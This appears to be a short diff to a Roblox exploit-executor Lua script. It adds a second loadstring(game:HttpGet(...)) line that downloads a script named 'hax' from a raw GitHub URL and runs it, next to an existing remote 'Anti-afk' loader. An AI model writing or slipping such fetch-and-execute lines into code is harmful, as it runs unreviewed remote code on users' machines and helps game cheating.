@@ -1,4 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/hassanxzayn-lua/Anti-afk/main/antiafkbyhassanxzyn"))(); 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/haxvendas/main.lua/refs/heads/main/hax", true))();
 
 if not game:IsLoaded() then
 
